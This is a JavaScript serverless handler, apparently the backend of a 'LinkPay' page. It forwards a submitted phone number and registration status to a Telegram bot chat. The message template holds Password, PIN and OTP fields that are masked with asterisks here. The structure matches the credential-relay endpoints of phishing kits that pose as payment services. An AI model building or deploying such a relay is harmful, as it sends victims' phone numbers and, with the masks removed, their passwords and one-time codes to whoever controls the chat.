export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({
      error: "Method not allowed"
    });
  }

  try {
    const { phone, result } = req.body || {};

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      return res.status(500).json({
        error: "Telegram not configured"
      });
    }

    // Phone number बिना hide किए
    const safePhone = phone || "Not provided";

    const message =
      `🔔 LinkPay Notification\n\n` +
      `📱 Phone: ${safePhone}\n` +
      `🔑 Password: ********\n` +
      `🔢 PIN: ****\n` +
      `🔐 OTP: ******\n` +
      `✅ Status: ${result || "Registration attempted"}`;

    const response = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }
    );

    if (!response.ok) {
      const errorText = await response.text();

      return res.status(500).json({
        error: "Telegram request failed",
        details: errorText
      });
    }

    return res.status(200).json({
      success: true
    });

  } catch (error) {
    return res.status(500).json({
      error: "Server error"
    });
  }
}
